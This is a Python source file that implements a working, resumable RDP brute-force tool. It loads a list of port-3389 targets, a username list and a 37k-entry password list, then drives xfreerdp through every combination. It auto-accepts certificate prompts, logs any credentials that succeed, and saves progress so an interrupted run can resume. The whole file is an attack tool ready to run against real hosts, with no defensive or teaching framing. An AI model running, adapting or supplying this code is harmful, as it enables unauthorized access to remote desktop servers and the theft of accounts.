import os
import re
import time
import json
import queue
import select
import logging
import threading
import subprocess


class Manager:
    STATUS_ERROR = -1  # connection lost or refused
    STATUS_SUCCESS = 0
    STATUS_DENIED = 1  # password denied
    #
    AUTO_SAVE = 10.0
    MAX_ERROR = 5

    def __init__(self):
        #
        # load targets, userlist, passlist
        self._targets = queue.Queue()
        self._init_targets()
        self._userlist = list()
        self._init_userlist()
        self._passlist = list()
        self._init_passlist()
        #
        # for loading and restoring progress
        self._lock = threading.Lock()
        self._progress = dict()
        self._init_progress()
        self._last_save_time = time.time()
        #
        self._attempt_count = 0

    def _init_targets(self):
        with open('targets/3389.txt', encoding='utf-8') as f:
            for line in f:
                line = line.rstrip('\n')
                self._targets.put(line)

    def _init_userlist(self):
        with open('username/rdp.txt', encoding='utf-8') as f:
            for line in f:
                line = line.rstrip('\n')
                self._userlist.append(line)
        assert len(self._userlist) != 0

    def _init_passlist(self):
        with open('password/37k.txt', encoding='utf-8') as f:
            for line in f:
                line = line.rstrip('\n')
                self._passlist.append(line)
        assert len(self._passlist) != 0

    def _init_progress(self):
        try:
            with open('restore.json', encoding='utf-8') as f:
                self._progress = json.load(f)
        except FileNotFoundError:
            pass

    def _get_progress(self, target):
        assert target is not None
        self._lock.acquire()
        value = self._progress.get(target, [0, 0, True, 0])  # username_idx, password_idx, available, error_count
        self._lock.release()
        return value

    def _save_progress(self, target, username_idx, password_idx, available, error_count):
        self._lock.acquire()
        self._progress[target] = [username_idx, password_idx, available, error_count]
        current_time = time.time()
        if current_time > self._last_save_time:
            if current_time - self._last_save_time > self.AUTO_SAVE:
                self._last_save_time = current_time
                with open('restore.json', 'w', encoding='utf-8') as f:
                    json.dump(self._progress, f)
                logging.debug('restore.json saved')
        else:  # system time changed
            self._last_save_time = current_time
        self._lock.release()

    def next_target(self):
        while self._targets.unfinished_tasks:
            # get an available target
            target = self._targets.get()
            username_idx, password_idx, available, error_count = self._get_progress(target)
            if available is False:
                self._targets.put(target)
                time.sleep(0.1)
                continue
            # get it and set to unavailable
            username, password = self._userlist[username_idx], self._passlist[password_idx]
            self._save_progress(target, username_idx, password_idx, False, error_count)
            return target, username, password
        return None, None, None

    def report_status(self, target, status):
        self._targets.task_done()
        username_idx, password_idx, available, error_count = self._get_progress(target)
        assert available is False
        #
        if status == self.STATUS_SUCCESS:
            username, password = self._userlist[username_idx], self._passlist[password_idx]
            logging.info('SUCCESS {0} {1} {2}'.format(target, username, password))
        elif status == self.STATUS_DENIED:
            # check if all login are finish
            if username_idx == len(self._userlist) - 1:
                if password_idx == len(self._passlist) - 1:
                    logging.debug('{0} is finish'.format(target))
                    return
                else:
                    username_idx = 0
                    password_idx += 1
            else:
                username_idx += 1
            self._save_progress(target, username_idx, password_idx, True, error_count)
            self._targets.put(target)
        elif status == self.STATUS_ERROR:
            error_count += 1
            if error_count < self.MAX_ERROR:
                self._save_progress(target, username_idx, password_idx, True, error_count)
                self._targets.put(target)
        else:
            raise NotImplementedError


class Brute(threading.Thread):
    STAGE_UNKNOWN, STAGE_CONTINUE, STAGE_CONFIRM, STAGE_ERROR, STAGE_DENIED, STAGE_OK = -1, 0, 1, 2, 3, 4

    def __init__(self, manager):
        threading.Thread.__init__(self)
        self._manager = manager

    def run(self):
        while True:
            target, username, password = self._manager.next_target()
            process = subprocess.Popen(['xfreerdp',
                                        '/v:{0}'.format(target),
                                        '/size:1x1',
                                        '/u:{0}'.format(username),
                                        '/p:{0}'.format(password)],
                                       stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            status_reported = False
            for _ in range(10):
                if status_reported is True:
                    break
                try:
                    rl, _, _ = select.select([process.stdout.fileno(), process.stderr.fileno()], [], [], 8.0)
                    if len(rl):
                        for fd in rl:
                            prompt = os.read(fd, 4096)
                            stage = self.expect(prompt)
                            if stage == self.STAGE_DENIED:
                                logging.debug('STAGE_DENIED: {0}'.format(prompt))
                                self._manager.report_status(target, self._manager.STATUS_DENIED)
                                status_reported = True
                            elif stage == self.STAGE_OK:
                                logging.info('STAGE_OK: {0}'.format(prompt))
                                self._manager.report_status(target, self._manager.STATUS_SUCCESS)
                                status_reported = True
                            elif stage == self.STAGE_CONTINUE:
                                logging.debug('STAGE_CONTINUE: {0}'.format(prompt))
                            elif stage == self.STAGE_ERROR:
                                logging.debug('STAGE_ERROR: {0}'.format(prompt))
                                self._manager.report_status(target, self._manager.STATUS_ERROR)
                                status_reported = True
                            elif stage == self.STAGE_UNKNOWN:
                                logging.debug('STAGE_UNKNOWN: {0}'.format(prompt))
                            elif stage == self.STAGE_CONFIRM:
                                logging.debug('STAGE_CONFIRM: {0}'.format(prompt))
                                process.stdin.write(b'Y\n')
                            else:
                                logging.debug('UNHANDLED: {0}'.format(prompt))
                except OSError as e:
                    if e.errno == 5:  # [Errno 5] Input/output error
                        logging.debug('[Errno 5] Input/output error')
                    else:
                        logging.warning('unhandled exception: {0} {1}'.format(type(e), e))
            time.sleep(5.0)

    def expect(self, prompt):
        prompt = prompt.decode(encoding='utf-8')
        #
        pattern = [r"(connected to)",
                   r"(protocol security negotiation or connection failure)",
                   r"(integer parameter out of range for operation)",
                   r"(Do you trust the above certificate)"]
        m = re.search('|'.join(pattern), prompt, re.DOTALL)
        if m is None:
            return self.STAGE_UNKNOWN
        elements = m.groups()
        elements = [e is not None for e in elements]
        if sum(elements) != 1:
            return self.STAGE_UNKNOWN
        idx = elements.index(True)
        return [self.STAGE_CONTINUE, self.STAGE_DENIED, self.STAGE_OK, self.STAGE_CONFIRM][idx]


def main():
    logging.basicConfig(level=logging.DEBUG)
    manager = Manager()
    for _ in range(1):
        t = Brute(manager)
        t.start()
        time.sleep(0.1)
    while threading.active_count():
        time.sleep(5.0)


if __name__ == '__main__':
    main()
